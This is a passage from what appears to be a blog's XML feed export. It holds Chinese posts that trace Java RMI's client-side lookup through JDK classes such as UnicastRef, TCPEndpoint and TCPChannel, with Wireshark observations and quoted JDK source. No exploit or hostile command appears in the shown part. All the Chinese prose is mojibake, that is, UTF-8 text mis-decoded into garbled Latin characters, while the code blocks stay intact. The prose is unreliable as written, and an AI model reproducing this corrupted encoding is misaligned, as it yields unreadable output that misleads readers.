ä¸º<code>Registry</code>æ˜¯æ‰©å±•äº†<code>Remote</code>æ¥å£çš„ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚<br>åˆ°äº†è¿™é‡Œæˆ‘ä»¬å°±è·å¾—äº†ä¸€ä¸ªæ³¨å†Œå™¨äº†ï¼Œåˆ°æ­¤ä¸ºæ­¢æˆ‘ä»¬ä»ç„¶æ²¡æœ‰å‘ç°å®¢æˆ·ç«¯å‘æ³¨å†Œä¸­å¿ƒå‘é€è¯·æ±‚è·å–å­˜æ ¹çš„ä»£ç ï¼Œä¸ºäº†éªŒè¯æˆ‘çš„æ¨å¯¼ï¼Œæˆ‘ä½¿ç”¨éš¾äº†wiresharkæŠ“åŒ…ï¼Œå‘ç°ç¡®å®æ²¡æœ‰å¯¼1099ç«¯å£çš„æµé‡ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ae46705e9699401864cf20c96aa27aa9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>é‚£ä¹ˆè¿™éƒ¨åˆ†ä»£ç æœ€æœ‰å¯èƒ½æ˜¯å­˜åœ¨äºlookupçš„è¿‡ç¨‹ä¸­ã€‚<br>æ¬²çŸ¥åäº‹å¦‚ä½•ï¼Œè¯·å¬ä¸‹å›åˆ†è¯´ã€‚</p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>RMI</tag>
      </tags>
  </entry>
  <entry>
    <title>ä»ä»£ç å±‚é¢çœ‹RMIè§„èŒƒçš„å®ç°ä¸æ”»å‡»åŸç†ï¼ˆäºŒï¼‰</title>
    <url>/archives/fa9410e3.html</url>
    <content><![CDATA[<p>@<a href="%E4%BB%8E%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E7%9C%8BRMI%E8%A7%84%E8%8C%83%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%EF%BC%88%E4%BA%8C%EF%BC%89">TOC</a></p>
<blockquote>
<p>æ—¥å¸¸åæ§½ï¼šè¿™ä»½å·¥ä½œç¡®å®æ— èŠï¼Œä¸å‡ºæ´»ï¼Œæ²¡è¿›æ­¥å°±æ˜¯æˆ‘ä¸Šç­çš„çœŸå®å†™ç…§ï¼Œå­¦ä¹ è¿›æ­¥è¿˜æ˜¯è¦çœ‹ä¸‹ç­åã€‚</p>
</blockquote>
<p>ä¸Šä¸€ç¯‡æ–‡ç« æˆ‘ä»¬çœ‹äº†RMIå®¢æˆ·ç«¯ä¾§ä»£ç è·å–ä¸€ä¸ªæ³¨å†Œä¸­å¿ƒçš„æ“ä½œï¼Œè¿™ä¸€æ¬¡æˆ‘ä»¬æ¥çœ‹çœ‹<code>lookup</code>å‡½æ•°æ˜¯æ€ä¹ˆå·¥ä½œçš„ï¼Œæœ‰ä¸å¯¹çš„åœ°æ–¹å¤§ä½¬è½»ç‚¹å–·ã€‚</p>
<p>åœ¨ä¸Šä¸€ç¯‡ä¸­æˆ‘ä»¬çŸ¥é“æœ€ç»ˆè·å–åˆ°çš„<code>Registry</code>å¯¹è±¡æ˜¯ç”±<code>RegistryImpl_Stub</code>ä¸æ–­è½¬å‹è¿‡æ¥çš„ï¼Œé‚£ä¹ˆä½¿ç”¨è¯¥å¯¹è±¡è°ƒç”¨<code>lookup</code>å‡½æ•°ç†è®ºä¸Šæ¥è¯´ä¹Ÿå°±æ˜¯ä¼šè°ƒç”¨<code>RegistryImpl_Stub</code>ä¸­çš„<code>lookup</code>å‡½æ•°ã€‚<br>é¦–å…ˆæ‰“æ–­ç‚¹è¿›å…¥åˆ°<code>lookup</code>å‡½æ•°ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/dbf896f525e005c3f49f93c2c2b39a37.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœç„¶æ˜¯è°ƒç”¨çš„<code>RegistryImpl_Stub</code>ä¸­çš„å‡½æ•°ï¼Œåˆ°è¿™é‡Œå‰æœŸæˆ‘ä»¬æœ‰ä¸¤ä¸ªç‚¹éœ€è¦å…³æ³¨ä¸€æ˜¯116è¡Œï¼Œä¸€æ˜¯123è¡Œã€‚<br>é¦–å…ˆæˆ‘ä»¬è·Ÿè¿›116è¡Œçš„æ–¹æ³•ï¼Œè¿™é‡Œè°ƒç”¨çš„æ˜¯<code>ref</code>å¯¹è±¡çš„newCallï¼Œä»åå­—æˆ‘ä»¬å¤§æ¦‚çŒœåˆ°å¯èƒ½æ˜¯è¦å‘é€è¯·æ±‚äº†ï¼Œé¦–å…ˆæˆ‘ä»¬ç”¨wiresharkè¿‡æ»¤ä¸€ä¸‹1099ç«¯å£ï¼Œç„¶åè®©ä»£ç æ‰§è¡Œå®Œ116è¡Œï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e42dd5107e36f41ed2c10a2d30a4d1e2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ ‡è®°1å¤„ç”±å®¢æˆ·ç«¯å‘æ³¨å†Œä¸­å¿ƒå‘é€è¯·æ±‚ï¼Œå‘é€è¦ä½¿ç”¨çš„JRMIç‰ˆæœ¬å·ï¼Œ2å¤„ç”±æ³¨å†Œä¸­å¿ƒå‘å®¢æˆ·ç«¯ç¡®è®¤ç‰ˆæœ¬å·ï¼Œè‡³äºç¬¬ä¸‰å¤„ä¹Ÿæ˜¯ç”±å®¢æˆ·ç«¯å‘èµ·ï¼Œå…·ä½“å¹²äº†ä»€ä¹ˆæˆ‘ä¸å¤ªæ¸…æ¥šï¼ˆé€šè¿‡åé¢çš„åˆ†ææˆ‘å‘ç°è¿™ä¸€æ­¥åº”è¯¥ä¹Ÿæ˜¯ç±»ä¼¼äºTCPä¸‰æ¬¡æ¡æ‰‹é‚£æ ·çš„ä¸€ä¸ªç¡®è®¤æœºåˆ¶ï¼Œæ³¨å†Œä¸­å¿ƒè¿”å›è‡ªå·±çš„IPåœ°å€ï¼Œç„¶åå®¢æˆ·ç«¯æå–ipæ”¾åˆ°è¿™ä¸ªåŒ…é‡Œé¢ï¼Œæœ€åå‘é€åˆ°æ³¨å†Œä¸­å¿ƒï¼Œæ³¨å†Œä¸­å¿ƒå†å¯¹è¿™æ¬¡è¯·æ±‚è¿›è¡Œç¡®è®¤ï¼‰ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/bafcbde8f4bf2a190f44ea70dd762b7a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹è¿™æ„æ€å‘é€äº†ä¸€ä¸ªipåœ°å€è¿‡å»ï¼Œéš¾é“æ˜¯åå•†è¦ç”¨å“ªä¸€å¼ ç½‘å¡ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ172è¿™ä¸ªipè¿˜æ˜¯æˆ‘å®‰è£…wslçš„æ—¶å€™ç”Ÿæˆçš„ä¸€å¼ è™šæ‹Ÿç½‘å¡ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ea3ac57bee04b54eb242d352b48f3a4a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹åå­—è¿˜æ˜¯ä¸ªè™šæ‹Ÿä»¥å¤ªç½‘äº¤æ¢æœºï¼Ÿï¼Ÿè¿™æˆ‘å°±æ›´è¿·æƒ‘äº†ã€‚ã€‚ã€‚ä¸è¿‡æš‚æ—¶è¿™ä¸é‡è¦ã€‚<br>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬å°±è¿›å…¥åˆ°è¿™ä¸ª<code>newCall</code>æ–¹æ³•ä¸­çœ‹ä¸€ä¸‹éƒ½åšäº†ä»€ä¹ˆå§ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9c92b01fedcdad85dff58052275cec1a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹åˆ°è¿›å…¥äº†<code>UnicastRef</code>è¿™ä¸ªç±»çš„ä¸­ï¼Œè¿™é‡Œæ³¨æ„ç¬¬343è¡Œçš„ä»£ç ï¼Œé¦–å…ˆè°ƒç”¨äº†<code>ref</code>å¯¹è±¡çš„<code>getChannel</code>æ–¹æ³•è‚¯å®šæ˜¯ä¼šè¿”å›ä¸€ä¸ªå¯¹è±¡çš„ï¼Œç„¶åå†è°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„<code>newConnection</code>æ–¹æ³•ï¼Œçœ‹ç€åå­—å·²ç»å¾ˆæ¸…æ¥šäº†è¿™åº”è¯¥å°±æ˜¯å‘é€è¯·æ±‚çš„å…³é”®å‡½æ•°äº†ã€‚<code>getChannel</code>ä¸å‡ºæ„å¤–æ˜¯è·å–ä¸€ä¸ªsocketé€šé“ï¼Œç„¶å<code>newConnection</code>æ–¹æ³•å‘é€è¯·æ±‚ï¼Œæˆ‘ä»¬çœ‹çœ‹å¯¹ä¸å¯¹ï¼Œé¦–å…ˆè¿›å…¥<code>getChannel</code>æ–¹æ³•ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/71d465617ce4c4548e6106ec95aa4323.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>çœ‹åˆ°è¿›å…¥äº†<code>LiveRef#getChannel</code>ï¼Œè¿™é‡Œå¤§çœ¼ä¸€ç§å°±æ³¨æ„åˆ°äº†ç¬¬152è¡Œã€‚è°ƒç”¨äº†<code>ep</code>å¯¹è±¡çš„<code>getChannel</code>æ–¹æ³•ï¼Œå¦‚æœè¿˜è®°å¾—ä¸Šä¸€ç¯‡çš„è¯ï¼Œåœ¨è·å–æ³¨å†Œä¸­å¿ƒçš„æ—¶å€™æˆ‘ä»¬è·å¾—è¿‡ä¸€æ¬¡<code>TCPEndpoint</code>å¯¹è±¡ç„¶åèµ‹å€¼ç»™äº†<code>ep</code>ï¼Œè¿™é‡Œå°±æ˜¯äº†ï¼Œ<code>ep</code>ä¸­å°è£…äº†æ³¨å†Œä¸­å¿ƒçš„hostä¸portï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d196277e2faec5a89a3d0d5a0b02b98b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿›å…¥åˆ°<code>getChannel</code>æ–¹æ³•ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/144f3de9286eb00c7507604db62c8f74.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æœç„¶æ¥åˆ°äº†<code>TCPEndpoint</code>ç±»ã€‚419è¡Œåˆæ˜¯å‡½æ•°å¥—å‡½æ•°ï¼Œä¸è¿‡<code>getOutBoundTransport</code>åº”è¯¥æ˜¯ä¸ªç±»å‡½æ•°ï¼Œç¿»è¯‘æˆä¸­æ–‡å°±æ˜¯è·å–å¯¹å¤–ç»‘å®šä¼ è¾“ï¼Œå¼ºè¡Œç¿»è¯‘äº†ä¸€æ³¢ã€‚ã€‚ã€‚ã€‚ä»åå­—çœ‹ä¸å‡ºæ¥ä»€ä¹ˆï¼Œè¿›åˆ°å‡½æ•°é‡Œé¢çœ‹çœ‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9a6527244365840d5bfdb548e6b15259.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ¬§ï¼Œåˆæœ‰ï¼Œå…ˆçœ‹<code>getLocalEndpoint</code>å‡½æ•°å§ï¼Œè¿›å»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TCPEndpoint <span class="title function_">getLocalEndpoint</span><span class="params">(<span class="type">int</span> port,</span></span><br><span class="line"><span class="params">                                               RMIClientSocketFactory csf,</span></span><br><span class="line"><span class="params">                                               RMIServerSocketFactory ssf)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Find mapping for an endpoint key to the list of local unique</span></span><br><span class="line"><span class="comment">         * endpoints for this client/server socket factory pair (perhaps</span></span><br><span class="line"><span class="comment">         * null) for the specific port.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">ep</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (localEndpoints) &#123;</span><br><span class="line">            <span class="type">TCPEndpoint</span> <span class="variable">endpointKey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="literal">null</span>, port, csf, ssf);</span><br><span class="line">            LinkedList&lt;TCPEndpoint&gt; epList = localEndpoints.get(endpointKey);</span><br><span class="line">            <span class="type">String</span> <span class="variable">localHost</span> <span class="operator">=</span> resampleLocalHost();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (epList == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * Create new endpoint list.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                ep = <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(localHost, port, csf, ssf);</span><br><span class="line">                epList = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;TCPEndpoint&gt;();</span><br><span class="line">                epList.add(ep);</span><br><span class="line">                ep.listenPort = port;</span><br><span class="line">                ep.transport = <span class="keyword">new</span> <span class="title class_">TCPTransport</span>(epList);</span><br><span class="line">                localEndpoints.put(endpointKey, epList);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                    TCPTransport.tcpLog.log(Log.BRIEF,</span><br><span class="line">                        <span class="string">&quot;created local endpoint for socket factory &quot;</span> + ssf +</span><br><span class="line">                        <span class="string">&quot; on port &quot;</span> + port);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">synchronized</span> (epList) &#123;</span><br><span class="line">                    ep = epList.getLast();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">lastHost</span> <span class="operator">=</span> ep.host;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">lastPort</span> <span class="operator">=</span>  ep.port;</span><br><span class="line">                    <span class="type">TCPTransport</span> <span class="variable">lastTransport</span> <span class="operator">=</span> ep.transport;</span><br><span class="line">                    <span class="comment">// assert (localHost == null ^ lastHost != null)</span></span><br><span class="line">                    <span class="keyword">if</span> (localHost != <span class="literal">null</span> &amp;&amp; !localHost.equals(lastHost)) &#123;</span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         * Hostname has been updated; add updated endpoint</span></span><br><span class="line"><span class="comment">                         * to list.</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">                        <span class="keyword">if</span> (lastPort != <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                             * Remove outdated endpoints only if the</span></span><br><span class="line"><span class="comment">                             * port has already been set on those endpoints.</span></span><br><span class="line"><span class="comment">                             */</span></span><br><span class="line">                            epList.clear();</span><br><span class="line">                        &#125;</span><br><span class="line">                        ep = <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(localHost, lastPort, csf, ssf);</span><br><span class="line">                        ep.listenPort = port;</span><br><span class="line">                        ep.transport = lastTransport;</span><br><span class="line">                        epList.add(ep);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ep;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é•¿çš„æœ‰ç‚¹è¿‡ç²ªäº†ã€‚ã€‚ã€‚ã€‚<br>çœ‹åˆ°å‡½æ•°ä¸­ä»£ç æ˜¯å¼‚æ­¥æ‰§è¡Œçš„ï¼Œè¿™ç©æ„å„¿æˆ‘pythonä¸­çš„å¼‚æ­¥éƒ½æ²¡å’‹ææ¸…æ¥šï¼Œæ›´åˆ«è¯´javaäº†ï¼Œä½†ä¸å½±å“æˆ‘çœ‹ä»£ç ã€‚ã€‚ã€‚<br>é¦–å…ˆnewäº†ä¸€ä¸ª<code>TCPEndpoint</code>ç±»å‹çš„endpointkeyï¼Œæš‚æ—¶ä¸çŸ¥é“å¹²ä»€ä¹ˆçš„ï¼Œç„¶åè°ƒç”¨äº†<code>localEndpoint</code>çš„getæ–¹æ³•ï¼Œçœ‹çœ‹<code>localEndpoint</code>æ˜¯ä»€ä¹ˆ<br><img src="https://i-blog.csdnimg.cn/blog_migrate/467770a61828fca8946939daf24c16ac.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><code>Map</code>ç±»å‹ï¼Œé”®ä¸º<code>TCPEndpoint</code>ç±»å‹ï¼Œå€¼ä¸ºLinkedListé›†åˆç±»å‹ã€‚æ‰€ä»¥<br><img src="https://i-blog.csdnimg.cn/blog_migrate/b31e77b96439a904f7ac83f2bce7a856.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>201å°±æ˜¯æ ¹æ®<code>endpointkey</code>ä»<code>Map</code>ä¸­ å–å€¼ï¼Œç„¶å202è¡Œè°ƒç”¨<code>resampleLocalHost</code>æ–¹æ³•å¯¹ä¸»æœºåè¿›è¡Œé‡æ–°é‡‡æ ·ï¼Œæˆ‘çŒœå°±æ˜¯å†è·å–ä¸€ä¸‹å¯¹hostè¿›è¡Œè§£æï¼Œä¸å¦¨è·Ÿè¿›å»çœ‹ä¸€çœ‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/aea1a383e6ae368a46fbd0b5e75f6981.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>257è¡Œè·å–äº†ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œçœ‹å‘½ååº”è¯¥æ˜¯ä»propertiesä¸­è·å–hostnameï¼Œè·Ÿè¿›<code>getHostnameProperty</code>å‡½æ•°çœ‹ä¸€ä¸‹ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/da119bd40e9e12c28d3b358372a8135d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™é‡Œæœ‰ä¸ª<code>GetPropertyAction</code>ç±»ï¼Œä¸Šç½‘æŸ¥äº†ä¸€ä¸‹ç²—ç³™çš„ç†è§£å°±æ˜¯è·å–propertiesçš„å€¼ï¼Œè¿›å…¥å‡½æ•°çœ‹äº†çœ‹å°±æ˜¯ä¸ªèµ‹å€¼æ“ä½œï¼Œä¸çŸ¥é“ä¸ºç”šä¹ˆç½‘ä¸Šé‚£æ ·è¯´ã€‚<br>æœ€ç»ˆçš„ç»“è®ºæ˜¯<code>resampleLocalHost</code>æ–¹æ³•è¿˜æ˜¯è¿”å›äº†æ³¨å†Œä¸­å¿ƒçš„IPåœ°å€ï¼Œå¯èƒ½å› ä¸ºæˆ‘è¿™é‡Œåœ¨æœ¬åœ°çœ‹ä¸å‡ºæ¥åŒºåˆ«ï¼Œåˆ†å¼€çš„è¯åº”è¯¥å°±èƒ½åˆ¤æ–­å‡ºä¸€äº›ä»€ä¹ˆäº†ã€‚<br>ç„¶åå›åˆ°<code>getLocalEndpoint</code>æ–¹æ³•<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e7a3fb0c0f7cbeb075727c3a33b65b2e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆåˆ›å»ºäº†ä¸€ä¸ª<code>TCPEndpoint</code>å¯¹è±¡ï¼Œä¸è¿‡è¿™æ—¶å€™æœ‰äº†ä¸»æœºåäº†localhostï¼Œä¸€ä¸ª<code>LinkedList</code>æŠŠæ–°çš„<code>ep</code>æ”¾è¿›å»ï¼Œç„¶ååˆè®¾ç½®äº†ä¸€ä¸‹epçš„<code>listenport</code>å±æ€§ï¼Œç„¶åæ–°å»ºä¸€ä¸ª<code>TCPTransport</code>èµ‹å€¼ç»™äº†<code>ep</code>çš„<code>transport</code>ï¼ŒçœŸæœ‰è¶£ï¼Œä¸€ä¸ªå¥—ä¸€ä¸ªã€‚ã€‚ã€‚ã€‚æœ€åè¿”å›äº†<code>ep</code>ï¼Œä¸€ä¸ª<code>TCPEndpoint</code>å¯¹è±¡ã€‚<br>ç„¶åæŠ›å‡ºåˆ°<code>getOutboundTransport</code>æ–¹æ³•åˆæ˜¯è¿™æ ·çš„ï¼š<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d49db9d235e7ceebf6abaecd40dd3cd1.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿˜æ˜¯è¦çš„<code>transport</code>ä½ è¯´æœ‰è¶£ä¸æœ‰è¶£ã€‚<br>ä¾æ¬¡å¾€ä¸ŠæŠ›ï¼Œæœ€ç»ˆè¿˜æ˜¯è°ƒç”¨çš„<code>TCPTransport</code>å¯¹è±¡çš„<code>getChannel</code>æ–¹æ³•ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/276f048bb9549fc1de41ac6470cd007d.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿™ä¸ª<code>channelTable</code>åˆæ˜¯ä¸€ä¸ª<code>Map</code><img src="https://i-blog.csdnimg.cn/blog_migrate/4b358d22fffa2030fdcd91d2c50fd03e.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸€ä¸ªç«¯ç‚¹å¯¹åº”ä¸€ä¸ªTCPé€šé“ï¼Œå¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬è¿˜æ²¡æœ‰å»ºç«‹é€šé“ï¼Œæ‰€ä»¥è¿™ä¸ªè¡¨ç°åœ¨è‚¯å®šæ˜¯ç©ºçš„ï¼Œæ‰€ä»¥åœ¨getçš„æ—¶å€™ä¸€æ˜¯è·å–äº†ä¸ªå¯‚å¯ã€‚<br>æ—¢ç„¶è¡¨ç¤ºç©ºçš„ï¼Œä¸‹é¢çš„æ“ä½œè‡ªç„¶å°±æ˜¯åˆ›å»ºä¸€ä¸ªé€šé“ç„¶åå»ºç«‹æ˜ å°„å…³ç³»ã€‚ç„¶åè¿”å›è¿™ä¸ªé€šé“ï¼Œç»ˆäº<code>getChannel</code>æ–¹æ³•ç»“æŸäº†ï¼Œç„¶åå°±æ˜¯å»ºç«‹è¿æ¥äº†ï¼Œä¹Ÿå°±æ˜¯è°ƒç”¨<code>TCPChannel</code>å¯¹è±¡çš„<code>newConnection</code>æ–¹æ³•ã€‚<br><img src="https://i-blog.csdnimg.cn/blog_migrate/22d3992d28378bcfb6ac6dd3fc0b294c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä»£ç æŒºé•¿çš„ï¼Œè¯´ç™½äº†å°±æ˜¯çœ‹çœ‹æ˜¯ä¸æ˜¯å·²ç»æœ‰äº†ä¸€ä¸ªè¿æ¥äº†ï¼Œå¦‚æœæœ‰äº†å°±ç›´æ¥æ‹¿æ¥ç”¨ï¼Œå¦‚æœæ²¡æœ‰å°±æ–°å»ºä¸€ä¸ªï¼Œæˆ‘ä»¬ç›´æ¥è¿›åˆ°æ–°å»ºçš„é€»è¾‘é‡Œé¢ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Connection <span class="title function_">createConnection</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        Connection conn;</span><br><span class="line"></span><br><span class="line">        TCPTransport.tcpLog.log(Log.BRIEF, <span class="string">&quot;create connection&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!usingMultiplexer) &#123;</span><br><span class="line">            <span class="type">Socket</span> <span class="variable">sock</span> <span class="operator">=</span> ep.newSocket();</span><br><span class="line">            conn = <span class="keyword">new</span> <span class="title class_">TCPConnection</span>(<span class="built_in">this</span>, sock);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">DataOutputStream</span> <span class="variable">out</span> <span class="operator">=</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(conn.getOutputStream());</span><br><span class="line">                writeTransportHeader(out);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// choose protocol (single op if not reusable socket)</span></span><br><span class="line">                <span class="keyword">if</span> (!conn.isReusable()) &#123;</span><br><span class="line">                    out.writeByte(TransportConstants.SingleOpProtocol);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    out.writeByte(TransportConstants.StreamProtocol);</span><br><span class="line">                    out.flush();</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * Set socket read timeout to configured value for JRMP</span></span><br><span class="line"><span class="comment">                     * connection handshake; this also serves to guard against</span></span><br><span class="line"><span class="comment">                     * non-JRMP servers that do not respond (see 4322806).</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="type">int</span> <span class="variable">originalSoTimeout</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        originalSoTimeout = sock.getSoTimeout();</span><br><span class="line">                        sock.setSoTimeout(handshakeTimeout);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="comment">// if we fail to set this, ignore and proceed anyway</span></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span></span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(conn.getInputStream());</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">ack</span> <span class="operator">=</span> in.readByte();</span><br><span class="line">                    <span class="keyword">if</span> (ack != TransportConstants.ProtocolAck) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConnectIOException</span>(</span><br><span class="line">                            ack == TransportConstants.ProtocolNack ?</span><br><span class="line">                            <span class="string">&quot;JRMP StreamProtocol not supported by server&quot;</span> :</span><br><span class="line">                            <span class="string">&quot;non-JRMP server at remote endpoint&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">String</span> <span class="variable">suggestedHost</span> <span class="operator">=</span> in.readUTF();</span><br><span class="line">                    <span class="type">int</span>    <span class="variable">suggestedPort</span> <span class="operator">=</span> in.readInt();</span><br><span class="line">                    <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                        TCPTransport.tcpLog.log(Log.VERBOSE,</span><br><span class="line">                            <span class="string">&quot;server suggested &quot;</span> + suggestedHost + <span class="string">&quot;:&quot;</span> +</span><br><span class="line">                            suggestedPort);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// set local host name, if unknown</span></span><br><span class="line">                    TCPEndpoint.setLocalHost(suggestedHost);</span><br><span class="line">                    <span class="comment">// do NOT set the default port, because we don&#x27;t</span></span><br><span class="line">                    <span class="comment">// know if we can&#x27;t listen YET...</span></span><br><span class="line"></span><br><span class="line">                    <span class="comment">// write out default endpoint to match protocol</span></span><br><span class="line">                    <span class="comment">// (but it serves no purpose)</span></span><br><span class="line">                    <span class="type">TCPEndpoint</span> <span class="variable">localEp</span> <span class="operator">=</span></span><br><span class="line">                        TCPEndpoint.getLocalEndpoint(<span class="number">0</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">                    out.writeUTF(localEp.getHost());</span><br><span class="line">                    out.writeInt(localEp.getPort());</span><br><span class="line">                    <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                        TCPTransport.tcpLog.log(Log.VERBOSE, <span class="string">&quot;using &quot;</span> +</span><br><span class="line">                            localEp.getHost() + <span class="string">&quot;:&quot;</span> + localEp.getPort());</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * After JRMP handshake, set socket read timeout to value</span></span><br><span class="line"><span class="comment">                     * configured for the rest of the lifetime of the</span></span><br><span class="line"><span class="comment">                     * connection.  <span class="doctag">NOTE:</span> this timeout, if configured to a</span></span><br><span class="line"><span class="comment">                     * finite duration, places an upper bound on the time</span></span><br><span class="line"><span class="comment">                     * that a remote method call is permitted to execute.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                         * If socket factory had set a non-zero timeout on its</span></span><br><span class="line"><span class="comment">                         * own, then restore it instead of using the property-</span></span><br><span class="line"><span class="comment">                         * configured value.</span></span><br><span class="line"><span class="comment">                         */</span></span><br><span class="line">                        sock.setSoTimeout((originalSoTimeout != <span class="number">0</span> ?</span><br><span class="line">                                           originalSoTimeout :</span><br><span class="line">                                           responseTimeout));</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        <span class="comment">// if we fail to set this, ignore and proceed anyway</span></span><br><span class="line">                    